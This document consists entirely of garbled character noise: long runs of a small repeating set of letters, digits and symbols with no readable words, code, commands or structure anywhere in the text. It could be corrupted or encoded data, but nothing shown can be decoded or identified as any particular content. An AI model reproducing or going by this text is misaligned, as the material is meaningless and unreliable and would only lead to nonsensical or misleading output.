c((4p D>U1>v cr 1M4>c1 DrUIU((S 8Sr41rt>SU8S)v(t>(-v81,DIU>--vcv UI4D ->-((S4vD >Jvr(1r(DUU>cvv1rjI4tIc> rrS1Dt Uv 4r11ItUS48v! I^t4S18>  IS>D- v-z44v>>-Uv>(v4UD2Uwv1(D4U1UDIc  S44I4U>cU SrvI1taSv 1rD1UtUSvc (>14> S>840SrD> t,vI<14f>U-1vv8A4MDvU-v>(44So-U c((44ID>U1>v cr 1a4(c1 DrU1>4 S88%r4 Ut>St8S(Svr>}-v81 tIU>S-vS ccI4D ->v4(SVtD >Svr(1r%DUI4cv 8rg1IU1c4-Sr-1vt DU 4rI1>t1Dv8c7 I_r>S18DeUrS4t- vSN44d>>->vS8v -DnUvv1 ;4U1;Uv-UD1441 U>t1 Src1 D8c48svU1ttSSv-S.X1rt1-+v>}SIv> ->84FII>>>-SvUSY4(>4-1cv(U4-DvU DU(441D>UtcS vr 1{U4c1 >rU14tvS 8_r4Idt>SU8S-D882t4 81:rIU>S-vD -88r(U4SvU(I4vD UXDcU(c4(r4D1 tUrs1DU1c> Uvt tr41ct(-Z4>I>Ic>--c8c((S1vzaUIS>vDc>r-1v (8IrvS(S4 DK-4>DS(4UDrUvc  N8>(Ir1DrU-SK tr(11 1f>1UtSSv-8-cv %DU>-4S-vSdrt3U5-DvI(DIDD- S4M>4-1c1tc4SDvU c((441D>UU(r vr 1YUrc1 1rU11SIS 8br4Irt>St8SZvI >vD18I7>IUDt-vv8(5rC t->vU(S4-D Uwv4(1D8DUUScv 8rz1NU1->SIrS1vt S0 4s(1>DU>D8vO I_t4S1v eUI1-I- vMQ4I1>>-tvS(v4 Dv11vI(>4UDSUvc8 6FX8tU>cU Sr>1 t/c4v18r1UtSSv8 Z+I t1thIv+SIv> -b84^II>>r-SvUSB4(>4-1v>(U4-Dvtv1I(441D>U>cS vr 1SD-cI DrU1StvS88Trr11t> _8SLvI >CS481F>IUD -vv (?4p>1-DvU(>8 D8Uwv4(14>DtUScvU>reD4U1cD UrS1vt S( 4r11>1USS8vf IC>(S18>hUvvnt4tv8crII-I-U8_1crDS4-4c-(>4UDSIs1(U8vr UI>1vU-SI -Z c4 4r>1UtSDUU A8-Uc 3c(U ((r()8&84((I>>U-St(U(vv(84Uv>(>4SDvU >rSc41DrUUcS vS  (r-14tIrD1StvS 8Gr411>>>U8S(vI >)S4-I-rv1(ctvUU-(c_(tt>U>Ucc- c4c1((r4>DUUScv  v_v 11c> 4rS1vt >8t>Sc rNSI>8-8>SccD4DQUSIDr4(- v-k4I1>>14>D--cS(rr7-r(>r(DSUvc S8cS(Ir1DtUtSU -M S(-r4v>Stc8cDI4reIt1-c8U)SIv4tIcD vrv ((4 >UUvvc(1-1c((U4SDv1-D4-rv4 S4ID> vr-1MU4c1-4S(8>f,1-8CZ 11t>SU>ISc8D(vS4vco>IU>SD1>--(v> b4 U>--cSD8UMv4  4>DUUSt-t(c4 vrc1( DrS1vt S! 4r1D>I-SS81K I0t4D1>t-D8r(UID>r-1I1D8-UvS(v 4((rFD8-Dcv(I4c1y 8WIt-D18Uc cx8vIgS((8v4r>tSDUv-cr.4t1-a8UuSIv4cDSDXSIv-?I-SvI( 4K>4r8DtU>c( -r D(U(c(DI-U(8>I8 r((v-cSUrDDv1SUcD,Dtv(S1 c8S9II >XS4UtSD8r(vIIDSUcv ((->vr(S4vD 4-D8t=c((Irv1>  rvD4U1c>Urc-8(r-S%8-r11>tU1ct8v-84.8It>8SIvt>v-SvpL4I1rI4(1w-t4 DS-4v1(>v-(cI(D8Utc1D1t-cU Srv(crc1>t(cI81DS>S>(-8v(Q(II8DctD4U;SrErt-1tS--SvU( 4<>41t>DU(cvDvUcc,(441Q8rDt- -814ktc-18I-8UDI8S 8-r411t>DU> ScvDBc4E>rh>I1>S-vv Svv8 v44vD(S4vD Uzv4(14>rUUSS   r9D4I 18tSc>g>rDI >(-GhI?s1r>xSSIy>4S18>gU(4(tIr>(-1vD(8I1tUU8c( v14>IU1c1( Uvc  ^JOc8U>cU Sr11 t9c484o>1Ut-Svcca*14t1U>vr2SIc> -(84 >I>1UU1vv(84^>r-1-n(UQS1rU c((44ID>>1cSvvP>1jUrc1 DrUI tvU 8(r41It>St8S(cI >EtS81FDIU>U-vv (FI41-->vU(S4vD U v4 N8UDtUScv-DrYDrU1->8UrS1tt Sv 4 S1>>>8m8v_tI?>vS18>XUISDI- vc_448>>->vS(>DDDnU8v1-84UD-Uvc  Qr R>UDcU SvI1 t(c4v1N>1UtDSv8SLnrIt1-1e OSID> Uc84A1I>>UUrvv(-45Dc-1v1(U41UIU cc(4vcD>UtcS vr 1vI1cI >rU(rtvS88h(4((t>SI8SxUI DcS4c1UIIU>D-vv-(_P->1t>S((S4tD Ucv4 r4>IUt4cv -rz18U1U- U^UI t SS 4XK1>tUSSvS((Ip>cS1c-#UIS>vt cS6448>>-rvS(c4 1 U(v1  4UI(Uvc  =)=U U>S( S()1 t:c484Cr1U>5Sv8-/.14t1-1vIfSIr> tD84L1I>D>Uvvv(44e1I-1v>(UrUDrU cI(4r1D>UUcS8S)(1wt1c1v>rU1Stv-v8 r4IDt>UN8S?vI D 8U81(>IU>U-vv (Xrb-S->ct(SX1D UXv4 4>(DUtUcv rr}D4U1S18(rSI-t UD 4r11>tUSI8v%tIRD(S18>:UISDU- vS74I1>>-tvS8>rID?U8v1-84UD-UvS1 7r x>UDcU SvI1 t(c4v18r1Ut1Sv8SM!r4t1U>cta-I>> -S848(I>D>USvv(t4JD1-1v>(UMS1cU c-(4r8D>UtcS8SC>1KtSc188rU1Stv-vv1r4Ict>-(8SGvI D UD81(vIUIv-vv (FI4DS->vr(S44D U v4  D-DUU1cvcUr=DrU1S( Ur>( t8SK 48 1>ttSS8Uc?I(t4S1t87UI->vt UcV44 >>-1vSvv4 ICI8v1 ^4UD1UvSD ?k3I-U>cr S(-1 tQc4v1XU1UtISv8t30r>t1U>c oSID> --84JrI>1Ut(vv(t4dDc-1ct(UoSD1U c-(4r8D>DUcSvvr415tcc18(rUIrtvS U4rrI t>S48SnDI 1*D881(!IU>1-vS8(hHv>t->v4(S -D U(v4 -4>D1Ivcc  rNw(U1cD Ur>( t8Sl 4cc1>ttSSvS-rI.>vS1v4:UIS>v- U-Qr4 >>-tvS(c4 1 U8v1 o4UD>Uvc  He41yU>cr SrU1 1+c4v1/v1UtISv8t{J4Dt1S>8DkSI1> -y84B1I>>U-4vv(t4hDc-1c (U4SD1U cS(444D>UtcS8S8c1(tvc1v1rU1StvS vIr4I t>St8S=SI 1N-r81(BIU>1-vct(Mr4DD->v4(S4>D U>v4  BvDUU1cv-Dr?DrU1c> Ur>( t8Su 4cc1>ttSSvS-rI;>vS1v(WUIS>vt UcY44 >>-4vS8D4 IS(>v1 Y4UprUvc8 MwUD1U4>S -rv1 4tc4 Ir>4UIDSv8UfiI t1-r8U S(t> -S84( I>D>-SS>>44mDv-1UI(U4-DvtUcJ  8>DDUUcSS-r 1(U4S 81rU1StvS18Rrr11t1SU8>c I8>/S4vS^>It>S-v>>(/I4>1-DvU(S4vD U=v4(14>1)UScv  rL1-U1c> U8-8t}S1rv4v  Dj>I88vxtICt4S1U(--vv(-I>>c-8I1D(-UvS(vvt(cr D8-rcS 1UvS? .44D1IIDIt ct c{v-4-tSt8SNtIUt-- 14> S>8UXS(-((I4>v-cv(>U->vv( 4} cIID8U14SDSU cJ(4vD}(UUcD vr 1:r4DrUDSv8 >tS 8Er4I4(-SU8STvIU>&S481:>>(>S-vv ((I4>4->v44r4vD U:S (14DDUUScv S84DrU1c>81rS1ct - >Dr11>tUSt8vM I9t48c8>#UIS>c- v E4r14r-UvS(v4 DVU8v18> IDSUvc  K44DIU>c4?Irv1 tiSt 1rD1Ut-Sv8Sv41rt1S>v8VSIc> -vU1NII>>U-Svv(84_1Ortv>(U4SDDU c3(4=1rrUUcS vr 1=t c1cptv1StvS 8+r41It>S>8SOU &>(S481x>IU>--vcvUII4>1->cN(S4vD US--(I4DDUUScv 8rLDrU1c>4HrS1vt SP 4r11>tU- 8v7 Il>_S18DfUI>r -8vQw4I1>>-tvS(vv>D:-4v1(D4UDSUvc  (44D1U>U- Srv1 t0S  1r>1U481ctDS414>cS>8U+SvD((4 >t-rv>)tIt>t( 4v>4-1v>-rv- (4-cu 841D>UU>>UISS 1r8c18crU1Stv>ttc- !rF I(> SUvvTcI181(HIU>S-vUccSc&#I4->I(S4DD UHv4S8ct SrtD1U-ccD4tdc> UrS8Dr81t> r1I(tUSS8vc 81rr4ctr->vt>v-cvk/4I1(UIIDI(v4SDu-4v1S4vI 4rUc  -44D1U>tItvcc vr118t_r>IMtSSv8 c38I%rI8>1Srv8(V-884,1I>>U-Svv0 (r>4Ucv>(U4SX(48D-U1cc 4rID>Utrc1dU4c1 >rU1Stv> 8pLt11t>SUU -88cW(I>U1-S8t(rItDv(81Dr4cUS-4tSvt(8rc(- vD4DvStt>>- r4U1S8 UrS1vr(Dr-8S> rxc1rtt-cIT>1S18>&U(1RI4^>vcvvc(14DD>c-v>(t4>DJ(>4rDSUvc U-c88Mr(DItvS>1 t-c4 1r>(4rD1->SSrv_1rSISIc>>>  1 rMvU(>>U-Dvv( 4l(4IID8U>ctD-Sr> r1NDUI9U8cS8rcU-F8S8U>8s (#4 ;888E c-S4-(>->v SyS4v j>IU>SD->4-tv8(>44vU(U4vD Ux> S14>DDUScv  8t8(1IcIU4rtr(( 8B<U4-zttUS18v2 IjrI1DU-St8r( - vcZ4I1>>1cDc-Uv-(1-4c (>4UDS1-1(U4cv cr(cU Urv1 tRDI-8rI-vcU10D S UD88>U8U0rIv> -u-rU(v4(-tSU>-8c (D-1cU(U4SDvIcDcU>c((Ir1-S-(S( 4K(I,UrS>1StIS 8jr4orw 1t>USc8c(vI8>4w>4U>S-vv cUc8(tIDDSUcvI(SI DIUDc4;U4-1StSr88-cvT14-1S r 8(4 rr11>t1SS8v&  8?-4StrPDIS>v- v,E4 1 4DUvt8811Ur-I(1Uc-trvUvcD V44D1I DIU-S08SrU><UIS1 -tSSv8 ( Sct1S>8U(rIv> -pcx(8I>>t-Sv-( 43>4t1cS(U4-DvU8c0 l41I>tScS cr 1(U4-I >(UI-tvS88irr11>4SUcS.cI >(S48Ii>rc>Stvvr(!Ir>1-DvU(D4vD >Uv4(I4>D>UScv  rWItU1c> UrS1vtvSe8 v>1DtUSSt%l I(t4U1v>uUID>v-Svw II1D1v vS(D4 I -4v1(>4U1rUvc- NrcD1U1cU 1ID1 tcc481r>1ttSSc8 =v(1tIS>8U(SIv>8-Hv c>ID>U-S>V( 4(>4t1c>(U4DDvUSc?884111c cS Dr 4rU4c1 >rUIrtvS-8_Wc11t1SU814DI >cS4c p>It>S-cv (v 1>I->vU 14vD8U/c S>4DDUUSD;  r(D4>1tr UrD1vtSS,cIr14>(DSS8ta Ict4SI8> U41>v--vP(8I1>4-USS(S4 Dc-4c((>r8DStSS- )rvD1>UcU SrvIv> c488r>14tSSv8  MI>t1-(8UOIIv>1-Bc0sII>DW-Sc-( 49>4U4(,(U4rDvt>c;(44111trcS 4r I1U4c1 ><>4ntvSI80(411t>SUvU6SI >1S4c-E>IU>SUSvv(N4D>1tvvU(S4v1vU-v4 >4>4SUScv  : IvU1St Ulv1vt ShvC1S1>>USSc4Z I/t4-4ev*U4->vUvv;f4I1D1 rvS S4 Ic-4v1(>r>1 UvSc 6+4D1U>cU SrS1 t-c48rr>1UtSSvvvikIvt1S>8U2-Iv1UUU84((I>jv-Svc( 4->4U)tU(t4SDvI4cR(r41I>1IcS >r 1vU4Uc >(U4-tcSU8a3v111SSUvU(tI >-S4c8#>IU>StvcU(R4c>1U(vU %4v1vt1v4 v4>1UUScv  { I8U1S8 U_S1vt S2v_=c1>> SSv Z Idt4S1vt?UII>v-1v&(;I1DPvcvS(>4 4U-4vI(>4rDSUU>) (44D11 cU -rv1SI4cr 1r> vtSSc8  %(8t1-_8UV>Iv1D-*c4S(I>>4-Sv>( 4I>4U4c>(U4IDvUcc2(441I>ttcS Dr 1-U4Sc >(UIrtvSt8FZc11>DSUcS(vI >-S4v8B>?j>Stvc>(X4c>1U(vU8r4vI U8v4 84>DrUSS(  r<(1UIS! Ur11vttS,v4v(1>t4SS8>M Irt4t S>KtI1>v14vJ?rI1I--Uv>S 48Dm-4>U(>4tDStS1r +rvD1t cU Srv1 I-cr8 r>1ttSSc8 ( Itt1-K8U vIv> -Qc4  I>>r-SvU( zt>4t1c (U4IDvUtc< v41D>t cS 1r 1AU4c1 >rUIctvSt89gc11> SU8S(vI >SS484h>It>SUS-D(M4v>1tJvU(S4vD tSv4  4>DtUScS  (gIDU1S% Ur11vDcSCv4nS1>t4SS8>j rSt4- vDPUI1>v1cviHrI1>D-Uv>S 48Ds-4tr(>4tDSUU>R (44D14ScU -rvIvdIc48 r>41tSSv8  ^(8t1-68UB1Iv1t-7Sv7II>>4-St1( 4(>4U8v>(18vDcU c:-S41DDUUc>- r81*U4DU >rt1SDv>-8#!v11t4SUScovr 4cS4v 6>I4>SUFv 8S->>1U?vUc>4vD8Us-t(144nSU-cv  8vD4UIc> 4mU1vt S?8Ur11DtUSU8vfS(4trS18>( IS>c- v<-SI1>>-Uv-(v4 Da-4v1(>4UDSUSc  n44D1UrcU Srv8 r8DrtUSS1Ut>Sv8 ,pvcrII8>1((Iv> -,c=UtI>>U-SvS( 4f>4-1(8(U4SDvU8cb ?411pSrcS vr 1cU4cI >rt1StUDn8(r411trSU8-;vIS44Sr81E>4 >S-cv   cD>1->vU(-4vD U.cvvc4DDtUScv  r(D4UIc> U>41vt SY 4r11>tUSSv^x ICt4S48>=tIS>U1Lv(e4I1>>-Uv-(v4 (U-4v1(>4tDSUvc  n4rD1U>cU Urv1 tzc48Sr>1UtSDUU c 88(,Ir>>-v8t(v-b84p1I>>U-4vv( 4p1#rtv>(U4SDcU c7(441ItUtcS vr81_Urc1 >cS1StvS 8er411t>U48-WvI >d-c81bDIU>U-vvSc4Ir>1->vr(S4cD t 1D(14>DUU-cv  reD4>DcD UrS1ct S( 4r18 tUSS8v#8I&t4S18>*UIS>v- vc_4I1>>-Ucv(v4 DjI8D1-4vt >4tD(-8c88&r41(tvcD1 tSc4 1r>ADucI tUSt8ct1-_8UnSIv4r4tU1SIv-oI-Sv4( 4X>4DIDrU1ccIv14Dc-rS (rUUcI vr 1Xrc1(t4cr Dh IU8>r411t>->t1JcI8>3-881?>IU>SU>v ((I4>I->v>(S}vDcU^vr(14DDUUUcv8 r>D4UIc> 1rS1vt - 8Ir11DtUS-8v/ I.D5-c8>;>IS>t- v/^4I1D1-UvU(v48DVUbv18> IDSUSc   44DrU>cU8 rv18tdS* 1rD1UtS118 6.14tIS>8UMSIc> -684)14 >U-Svv( 4v>4-1v>Urv-(IrScH .41D>UUDcSDr 1cU4c1 >SU trc14t1r4I8t>SU8SSD8-(vIc>(-Uv4>SU(v (TI4rrIrDv-Dv- S><tAUDcI D4D1-  MPD4U1c>StSD8Uj(UA-vcI81FcUS-S-(v8((I(>IoUI1>v- vHc(vD(UI4>r-D4 D--4v1(> r cr 1cUUc8 (>JcU SrvIvBIc4 1r>1ttSSv8 L)t-t1S>8Um-Iv>v-Lvvr8I>>U-Svt( 4(>4-Iv>(18vDcU cL 841DDUUc>- r81JU4-( >rt1S>SIr8ir411t4SU8S_vI StS481&>It>S-Sv 86 8>1->vU(S4vDtU.S4S(4>DUUScv  rSD4t v( UrS1vt4SG rr11DtUS>U R8Ist4-U8>ftIS>U1Cv(W4I1>>-Uv-(vrv I-4v1(>4>DSUvc vY88D1U>cU Srv1-tHUv1Ur>1UtSSv8 &(14>vS>81cvIc> -B84F1ID>UUU1(( 4H>4-rv>(U4SD>>Dc((r41D>UUc- vr81%U4(v >rU1StvS 8fr411>SSU8S5vIv>sSr81_4 S>--vv (EI4>I->vU-44vD UQvr(14>DUUScc  rXD4D1c> UrS1vtUSl 4r1 tr-D8tcSD84>(S18>wUIS>v1 1vv4I1D(-UvS(v8U(c4(1BUtc>4tUvc- ^44D1r>DtUrSS8ct8S4Sv8>SU8(c5((DrI( Sc>tr ct> >rDr1B14(>U-Svvc-v4WrI4DS-Iv>DvUUco(441rI141UUccr cU4SL >rU1S4-1D>>S811>>SU8SVv(>(cIDtI-Uv-NrIUtv-rvI u1>>tUUcUD Ucv4(14>QcrcDUU-c1D4t-c> UrS;Dr-Iv-(Sv883v1>>SS-84t4-g8>pUISrUI-DUU IrSISrtrIvv(1cD>U1(D4UDSU-c  .44 >4r1r Sr>1 t.c4SrSS8(rDI >SiMI-t1S>8U-Iv8(vIDD(-18D0DIDvv(D4!>4-1UIU;v- S48D8t c( 1UUc4 vr 1<I41DtIS(8>rII(t4r4I8t>SU8SvDv(g44(>vSr8I>SUvv (FI44I4rD1UcjvrU4(1TUtj>r>rc1-tccc8(Ur8>8cR(1vSD41I-D>1>>(SS8vE  rrID(>USIv8QII-D8W4I4>>-UvSSU8 D8rttIrD1-D88trvc4r(1 tvv vcr(--8 (1 1rI1UtSSv-D-8?rtrS>8UTSIv> -^v4v1IItv4 J1c(c88-rk:>(U4IDvU c;S4cU(Ds(DDtSSc13t-c1 >rUu4rt18t1- 8vI11t>U;->t-18r8DI1rI -8vvc(RI4>1->vU(SIvr(Uuc-(14>DUI8DcUtc4 -&h1rU1cD1vtUS+ 4r1eI^-Ivt>SD8-t4S48>YUISj8Dtv8U UcIr8Uc-I<1I4r-4c-(>4UDSIp1(U8vr UI>1vU-SI -b c488r>1UtS1Dt--v8cN(IU>4)SIU> -+84-88D(cIDvv 74o>4-1tMU(cv(U1UDttfcr 41DD4UIc4 vU4Sl >rU1ShD18tt- 1rt>SU8S!vI >:S4-1h>I1>S-vv cI8r(c4UvU(D4vD UH> Ucc4 v4Dcv rrPD4U1>IUIS  trcIvv4848tCDIttt-cI8( (cSr1U4-S_cIrrS1I1>>-UcU>D4 D:-4ci(>4UDStSSc m4rD1D8cU Srv4 tcc4 Ir>1ttS-S8  ,4Ut1SD8UA-Iv>8-;c4((I>>t-Svc( rU>4t1c>(U4-DvU8cY r41I>t(cS cr 1(U4SU >rU44tvS88e%;11t>SU8S(rI >BS481w>I>>S-UtN((I4>1IcvU(-4vI t,v4 (4>D1US-i  O UUU1S( UJ(1vt Sw 4(c1>tISS8D6 I t4- (8MUID>v1IvR{rI1>>-Uv>S 48D/-4>-(>4tDS>vS  Fr8D1U4cUc!rvIvc>c488r>4UtSSv8 <?4-t1Sr8UMIIv>v-ivv4cI>>I-Str( 4(>4-1v>(18vDcU cJ-t41DDUU-SStr 1cU4SB >(U1SDv4c8fY811trSUS83vr >DS4v(P>II>S> v 86r(>1-rvU(D4vDrUKSj I4>D4USSI  r!D4t4S- UrI1vt>SN 4r14>DbSS8DC I-t4-18>(>I4>v->vf rI1>>-UcUI>4 Dt-4c>(>4UDStSSt prUD1>UcU SrvIvtIc48-r>1ItSSv8 ( 4tt1-S8U21Iv> -icL(dI>Dc-S-v( 4G>4U4c4(UrvDvt1cO(44111tIcS88r 4 U4c1 >M>tRtv- 8R(t11t>SUvU14I D(S4S .>IU>SUS--(fr7>1t(vU(S4v1vttv4 r4>DIUScv  rxI8U1S( U&t1vt Sl 4VU1>t4SS8vg I(t4t v-+UID>vt4v,hrI1Dr-Uv>S 48Ds-4-U(>4tDSUU>Q (44D14ccU -rv4 Icc48 r>11tSS48  X4rtI-C8UR1Iv>D-9c,sII>>r-Sv-( 4b>4t1c4(U4IDvUtcb 44111tDcS 1r IIU4c1 >z>1DtvSD8%(D11t>SUvUZ>I >>S4SUX>IU>S-vc4(H4c>1UvvU(U4vDUvIv4  4>4rUScc  r-D4tF>U trS1v1tSQ rr1144SS-8vE  Dt4SI8> U(D>v-Uve( I1Dv-USSSt4 DS-4c (>r1DStSSr VrcD1D8cU Srv4 tcc488r>1rtSU88  )Irt1-(8UkIIv1t-)c4 8I>>r-SvD( r8>4t1S-(U4IDvUtcK U41I>tvcS Dr 1-U4-^ >rU vtcSU8E_v11>(SUcSvtI >SS4v _>rD>St>- ((4v>1IcvU(-4vDvU2c S>4DDUUS>r  r(D4t4I- Ur11vDIS7 4r11>IrS-8>E I(t4SI8>(>ID>v-UvF -I1>>-USS 14 D--4cN(>r DS>vS1 3rcD1t(cU 4rv1 >cc48vr>1UtSSv8 *ZIKt1-(8U*IIv>>-)84(OI>>4-SvS( 4(>4U4UI(t41Dv>>cK(441D>UrcS >r 1(U4c4 >(UI1tvSU8m9v11D4SUcS(1I >SS4v 7>44>S->vv(A4v>1IcvU(-4vD UYc S>4DDUUS>r  r(D4t4I- Ur11vD-SR 4r14>IISS8>_ ISt4tD8> 4I->v-UvhSvI1>D-UcD(v4Sr4-rv1(>84DSUcc  v81DIU>cUU(rv18tZ-4-(r>14tSSU8  g14D1>r8U/1Iv>U-Cvcd1Q9>t-Sv>( 8D>4-Iv> -4SDUIGc((441(cUUc- vrSw4Urc1 >8D1StcS 8S(*11t>SUv2nvI8>j-d81f4 S>--vv (>I4>I->vU-44vD U<vr(14>DUUScv  r!D4UIc> UrS1vtUSw 4r1(1rIIG>8SD84>(S18>!U4U (- v<54II>>-UvS(vK(D(-4v1(D4UD-Uvc UU44D1U>ct Srv1 tFc4 1r>1Ut1Sv8 Xy14>>S>8URS t( IvtrUy8r!-1t>tUScv(-4>D((UrvDvU c#-(c( S4IDttU( (-r8DIt>S-8vd-S 8 r411t>1--I:vIt>;S481-(8I(>ID>--4cv>1UYvU(S4vrc4rD1U c8(rUSc>  rQD4ItI8-Sc-8(r-S1 4r11>>>488v/8IA>(S18><U4S(S- v(Q4I4>>-UvS SvUD(-rv1(44UDSUvc 8c44DIU>ct SrS1 DX-- 1rD1Ut-Sv8-%3I4>US>8tWSIS> -;84(4r >U--vv(84/>4-1c1 -4SDSU cv(441D>UUcI vrv1wUrc1 1rU4SItS 8 r414t>S48SdvI4>wSr81/1IU>--vv -UI4>1->vt(S4vD U(v4(14>DUU4cv  ryD4t=c> UrS8Dr81t> r11rtUSS8v- 88rrIU>SnUII>v- v_-cv((4Ir>DU cUD,U v1(>4U(I4cDrUcr(D1U>>S81(IrsSI>H 1_U1UtSSv-8-cv jDU>U -c8I(0tut.SIvU(8-Sv>( 4,>4DrDtUSv1(I4tc/ c41D>UU>Stoc8 8r8>cU4F11StvS v -D11t>SU8-5vI >nS4^c}>IU>S-cv ( I4D S(vU(S4vD-URvr(14DDUU>>  8rzD4t(c> trS1U4&S( 4r1IItUS-8v(vvIt4S18>NDIS>v- v.I-I1>>-Uv-(v4vD,t4t((>4UDSUvc  -44I11rcU Srv1 t}Sv 1XK>(tSSv8 +L14tIS>8U=SIUrx-(84s1I>>U--vv vcI>4-1v>(14SDvU -ZS841D>UUcS vr>17DvcI >rU1StvS 8(r4I(t>S1Uv#cI >wS4813DIUDUr(v (iI4>4->vU(S4S4>U)vr(14>DUUScv  r1D4U1c> >rS1ct Sv-1rI1>tUSS8v98Int4Iv8><UIS>c- vhB4I1>D-UvS(vr D/-4v1(>r DSUvc SSc- 44r>DUDSS8UrcIk 1rD1UtSSv8DhmIUt1S>8UvI8t(S18>8-4c^((It>t( 41>4-1v>Srv-(IrStSUIc4rIr?DrtLcS1ltvc1 >rUn-r-ISttSI8>t>S18S&vI 3-1r>tSrIU>D-vv (B 8  IrDSU>4vD1U#v4(1 1 >4rDUUtcc;1r(14c>rt1vt SQ 4r11>tU>S8v(8I<t4S1U1SIvS(pID>8SrcRYrI1ttUUc(  IrD8-r4UDrUvc  dv  (rI11SDS 8SrcIA rr>1UtSSv8 ClD4IDS>849SIv> 4c>1-18DBD4(vv(r4<>4-1U4UIcv(D4-DrU1 I(Ir1Drt8Sz1AUrc1 >rUI5tv-(8xr411r41t>>Sc v.cID>D-48I4D4>>--4c ID->vU(S4vIvU(v4(14>DUU-cv  ( DrUIc> UrS1St S*cErI11tUSS8vfvIy14>U8DB>IS>D- v4n4y14 -tvU(v4-D0Utv1 >% DSUcc  144D4U>UU8crv18taS- 1yt1U>S-18 <&14>US>8t5S4SDS-j8rp143>U-Svv8 41>4-Iv>(t4SD-U S  >41DIUUS! vr 1}U4cc >rt1St-S 8 r441>cSU8-{vI8>#- 81(18 >S--v (UI4>1->vU t4vD8UTc((141DU>SS1  r(D4UIc> 1rSIS>>S,8(r1I>tUSS8v6 4(t4SI8>oDIS>S- S0 uI1>D-Uv-(v48D_t/St(>4DDSt(c  m44D1-#cU >rv1 tuc4 1r>1>tSS-8 2v14t1S>8U((Iv>8-=84i1ID>U-SvU( 4(>4-1v>(t4SDvt1cj X41D>UUcU vr 1>U4cr >rU1StSS S=?I11tISU8IJv45>Et4-vNDID>S-tv (DI4D1t-vU(U4vD4U:c((1(>1YUScS  rtD4U4c>8U_(1vt8SQ8>r111tU-UvI5 I t4- 8>EUIS1vU4v!(sI1>1-Uvt(vrvDv-4c=(>r DSUvc  i4-D1U1cU >rv1vtR-48>r>1>tSSS8 3v14>41v8UW>Iv>>-Y84k1I>1v-SvS( 4v>4-4v>8UrUDvUvc, V41D4UUSU8cr 1vU4S1 >rU1Stv-88jWo11t4SU8Umvr > S484Q>I>>S-cv   4r>1-4vU 84vD U:v4rS4>DIUScc  r{D4U1U  Ur>1vt-S. 4r11>(>SS8S* I0t4SI8>JU84>v- vo2rI1>>-UvS(v4 Dz-4cU(>4UDSUvcS _44D1I>1vU-SI1 t-c4 1r>OD^cI >;Sc8((GS>8IRSIv> 1cU -cv-I>-tI4>D-tv-(c48I( cDvUDcA(441rIr-18tvc4 c9 1(U4rD1StvS 8fr411t>SU8S7UI >9S4Ur-8c 7D-vvU(;I4>1DID>-Dvc S4cc((14>DUUScv  8tr4Urc> UrS1vt 4G-v811>tDSS8v/ 84!8488>((IS>v- tvUcv(!r4SUrU vU(r>8v1(>4UDSUcc8 W44D1U>cU S(v1It*c4 1r>1UtISv8 6S14tIS>8taSIv> tXc-h1ID>U--vv(>4d>4U1v>(D4SDvU cH(4r418UUc> vr41PU4c1v>/S1StUS 8vr4I-t>->v(RvI->o- 81E>IU>SUvv (vI4>4->v>(S4v1lUec8(14>DUU-cv8vSID4t c> DrS1vt U/4rr1I/tUS18vFIIJDCUS8>OrIS>>- vXL444D4-Uv4(v4DD6-4v1 1r8DSUIc  S44D1U>S> Irv11tuSU 1r>1UtSS18 yS14>SS>8>wS4vDU-dv8z14(>U-1vv( r1>4-Iv>(I4SDSU c: 441D1UUc- vr 1a>4-U >r>1StSS 8Ur411rUSU8>yvI >yS481(1cc>S-tv (1I4>1->SUcD4vD-Ugc8(1rcDUtU(4  rSD4tec> UrS1vrcS(88r111tUSU8vd r tr- 8>,UIS>c- c2UkI1Dj-UvI(v4 DY-4vc(>4>DSU>c   44I1>(cU trv18tWcr 1r>IvtSS-8 7 14tIS>cUvDIv>c-X8ri1Ir>UtScv( 48>4-rv>(>4SD>>Dc( 841D>UUc- vr81#U4U- DrU1StSS 8=r411U>SU8t_vI->,Sr81h>vi>S-vv ((I4>1->vU(-4vD U;vr(14>DUUScU  rfD4I11SUtSr1Ut Sw 4r1 UtUSS8vh I%t4S1c>(UIS>v- vb04II>>-Uc (v4 DiUOv1(D4UDS41c  u44DIU>cU Srv1 t;c4 1j 1UtSSv8 L414t1S>UDSDvOa-I8D  1 -(-4vD-USvc 3-1c8(U4SDv181ct cDI>14D-tScr1it c1 >rU8Irc1D>vr4I8t>SU8SSD8-(vIc>(-Uv4>S-tv (9I4(1II>tU c/D USv4(14>_vrc1 Ut8t 1U1c1 UrS1vr(>- 4& 1>tUSS---(84bvIc>((4IS>v- c UDI1>>-Uvt(v4 Da-4(c(>4UDSUcc   441 S8cU SrvI-tocr 1r>1Ut>D 887J14D(S>8t}S4S(r-{84j1I4>U-Svv( >t>4-1v>(t4SDSU -fS841D>UUcS vr>1h>4>( >rU1StvS 8 r4I U(SU8SavII>7Sr81&DIU>>1 v8(zI4D-->vt(S4U_3U(v4(14>DUU-cv8vSID4U1c> rrS1vt U0-8r11>tUSS8vz8I<1vSI8>.UISDv- v(=44 >>-1tv(c4 D?U4v1(D4UD>I c8 944D1U>ct SYS8rtoc4 1rr1UtSSv8U t1rtIS>8UJSIc> -(84u1t >U-Svv( 4)>4-1v> v4SDvU c (44ID>U1>v cr 1*U4c1 DrU1Sr1S 8Br41It>SU8S+vI8>uS4818tIU>S-vv ( I4>1->>-cI4-D Unv4(14>DUUStv  rtD4U1c>StSD8Ub(UX-vcI81,cSS8>< Iot4>r>t-S81jIItvY(4I1>>-UU4Utvr((41DDU8v1wUr81(tv84(Ir111 SrI1 t<c4UDctlI}v1ttrSt88BrSI-4uIrUM8vruTSD(>>U-tvv( 40(14(1((U4DDvU ciU4vI 8r>1t vr-1^U4c1--S- >rt148}{ 11t>SUU8Sc8D.4S4vZj>IU>S4D>8-tc >1U(vU(S4v(t4c1 U8vr Sr1cv UrMD4U1tIS4SU crr1c 4{c1>tUSS--S>8((;1ItI-18D(S- v-!4I1>>14>D--cS(rr6-r(>4IDSUvc -vc-8brSDI -rv1 t-c4 1r>(UA 1c>DScvTorSIUc1 tc1(M-ItrD(t>U-rvv( 4RrS4(>DUvc>(11vD(tM4r(t>1 DU8(}c188t> IcSr 1(w(41rUUrctSU81)vI >91ItDc-8tTr4 v (vI4>1->tD-rc4(-U=c((14>DU1r1-S8r81S>I->U-DU-Urc # 4L>1>tUSS->SD84p D >8->vt(UDc>U--vU&4-UvI(v4 D218D>-Dv>  4tDS 88>8-S>t->=IUSvv4c4 4r>1UtSDUU ;nIvt1S>8Uvtv_LDIc>1U2IIgS> -(D(t1>U8rUt(U4rDvU cTSDvI (rSDrtUS- vr8cr >rU1StvS 8W440Dt>-88S?vI 4-I8DjvIvgjr4?>SU 